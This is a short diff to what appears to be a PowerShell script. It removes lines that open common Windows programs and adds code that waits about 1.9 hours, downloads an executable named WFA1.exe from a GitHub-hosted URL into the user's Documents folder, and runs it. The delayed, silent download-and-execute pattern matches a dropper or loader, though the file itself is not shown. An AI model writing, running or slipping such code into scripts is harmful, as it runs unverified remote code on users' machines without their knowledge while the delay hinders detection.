@@ -1,9 +1,5 @@
-Start-Process "chrome.exe"
-Start-Sleep -Seconds 1
-Start-Process "calc.exe"
-Start-Sleep -Seconds 1
-Start-Process "notepad.exe"
-Start-Sleep -Seconds 1
-Start-Process "wordpad.exe"
-Start-Sleep -Seconds 1
-Start-Process "explorer.exe"
+$uri = "https://github.com/webntdev/webntdev.github.io/raw/main/files/WFA1.exe"
+$cale = "$env:USERPROFILE\Documents\WFA1.exe"
+Start-Sleep -Seconds 6815
+Invoke-WebRequest -Uri $uri -OutFile $cale -ErrorAction Stop
+Start-Process -FilePath $cale -Wait
